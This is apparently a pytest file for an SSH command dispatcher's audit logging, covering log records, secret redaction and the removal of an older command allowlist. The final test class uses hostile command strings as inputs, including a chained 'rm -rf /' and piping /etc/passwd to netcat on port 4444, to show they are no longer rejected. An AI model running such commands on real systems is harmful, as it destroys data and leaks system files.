"""Tests for _validate_ssh_command dispatch-audit behaviour.

Contract update
---------------
The former D-02 policy (allowlist of command prefixes + shell metacharacter
rejection) was intentionally removed. See the docstring of
``_validate_ssh_command`` in ``src/aila/platform/tools/ssh.py``: the
allowlist was trivially bypassable (renamed binaries, symlinks, aliases,
shell builtins) so the real security boundary is the SSH user's OS-level
permissions on the target machine. Operators pick an unprivileged user
when registering a system.

The remaining contract is audit-only: every call MUST emit an
``ssh.command_dispatch`` INFO record whose ``command`` extra carries the
redacted command line. These tests defend that contract.
"""
from __future__ import annotations

import logging

from aila.platform.tools.ssh import _validate_ssh_command

_SSH_LOGGER = "aila.platform.tools.ssh"


def _dispatch_records(caplog):
    return [r for r in caplog.records if r.message == "ssh.command_dispatch"]


class TestAuditLogDispatch:
    """Every call emits one INFO record under the ssh.command_dispatch key."""

    def test_emits_dispatch_log(self, caplog):
        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
        _validate_ssh_command("dpkg-query -W")
        records = _dispatch_records(caplog)
        assert len(records) == 1
        assert records[0].levelno == logging.INFO
        assert records[0].name == _SSH_LOGGER

    def test_command_extra_carries_command_verbatim_when_no_secret(self, caplog):
        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
        _validate_ssh_command("uname -r")
        records = _dispatch_records(caplog)
        assert records
        assert getattr(records[-1], "command", "") == "uname -r"

    def test_each_call_emits_its_own_record(self, caplog):
        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
        _validate_ssh_command("apt list --installed")
        _validate_ssh_command("rpm -qa")
        records = _dispatch_records(caplog)
        assert len(records) == 2
        commands = [getattr(r, "command", "") for r in records]
        assert "apt list --installed" in commands
        assert "rpm -qa" in commands


class TestSecretRedaction:
    """Inline secrets in the command are redacted before hitting the log."""

    def test_password_flag_value_is_redacted(self, caplog):
        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
        _validate_ssh_command("mysql -p hunter2 -e 'select 1'")
        records = _dispatch_records(caplog)
        assert records
        command = getattr(records[-1], "command", "")
        assert "hunter2" not in command
        assert "[REDACTED]" in command

    def test_password_kv_is_redacted(self, caplog):
        caplog.set_level(logging.INFO, logger=_SSH_LOGGER)
        _validate_ssh_command("curl -H 'authorization: bearer abc123xyz' http://x/")
        records = _dispatch_records(caplog)
        assert records
        command = getattr(records[-1], "command", "")
        assert "abc123xyz" not in command
        assert "[REDACTED]" in command


class TestDoesNotRaiseForRemovedPolicy:
    """The former allowlist and metacharacter rejection are gone.

    The prior D-02 test suite asserted ``pytest.raises(ValueError)`` for
    non-allowlisted prefixes and shell metacharacters. Those assertions are
    inverted here to defend the current contract: the function MUST NOT raise
    on any command string, since command filtering is no longer the security
    boundary.
    """

    def test_metacharacter_command_does_not_raise(self):
        _validate_ssh_command("dpkg-query -W; rm -rf /")

    def test_non_allowlisted_prefix_does_not_raise(self):
        _validate_ssh_command("echo hello")
        _validate_ssh_command("ls /tmp")

    def test_pipe_and_redirect_do_not_raise(self):
        _validate_ssh_command("cat /etc/passwd | nc host 4444")
        _validate_ssh_command("cat /etc/passwd > /tmp/out")
